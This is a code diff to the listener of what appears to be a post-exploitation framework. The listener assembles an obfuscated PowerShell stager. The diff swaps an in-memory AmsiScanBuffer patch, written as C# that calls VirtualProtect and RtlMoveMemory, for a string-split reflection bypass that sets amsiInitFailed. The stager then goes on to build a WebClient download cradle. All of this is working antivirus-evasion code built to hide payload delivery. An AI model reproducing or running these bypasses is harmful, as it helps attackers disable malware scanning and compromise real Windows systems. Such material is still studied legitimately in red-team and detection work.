@@ -323,18 +323,9 @@ class Listener:
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}};")
 
                     # AMSI bypass
-                    stager += '$code = @"\n'
-                    stager += 'using System;using System.Runtime.InteropServices;namespace Bypass{'
-                    stager += 'public class ABP{[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);'
-                    stager += '[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);[DllImport("kernel32")]'
-                    stager += 'public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);'
-                    stager += '[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)] static extern void MoveMemory(IntPtr dest, IntPtr src, int size);'
-                    stager += 'public static int BP(){IntPtr TargetDLL = LoadLibrary("ams"+"i.dll");'
-                    stager += 'IntPtr A = GetProcAddress(TargetDLL, "AmsiS"+"canBuffer");UIntPtr dwSize = (UIntPtr)5;uint Zero = 0;'
-                    stager += 'VirtualProtect(A, dwSize, 0x40, out Zero);Byte[] Patch = { 0x31, 0xff, 0x90 };'
-                    stager += 'IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);Marshal.Copy(Patch, 0, unmanagedPointer, 3);'
-                    stager += 'MoveMemory(A + 0x001b, unmanagedPointer, 3);return 0;}}}\n'
-                    stager += '"@\n;add-type -typedefinition $code;[Bypass.ABP]::BP();'
+                    stager += '$p6="iInitFai";$p1="System.Management";$p5="ams";$p4="iUtils";$p7="led";$p3="on.Ams";$p8="NonPub";$p9="lic,Stat";'
+                    stager += '$p10="ic";$p11=$null;$p12=$true;$p2=".Automati";[Ref].Assembly.GetType($p1+$p2+$p3+$p4).GetField($p5+$p6+$p7,$p8+$p9+$p10)'
+                    stager += '.SetValue($p11,$p12)'
 
                 stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
                 stager += helpers.randomize_capitalization("$" + helpers.generate_random_script_var_name("wc") + "= New-Object System.Net.WebClient;")
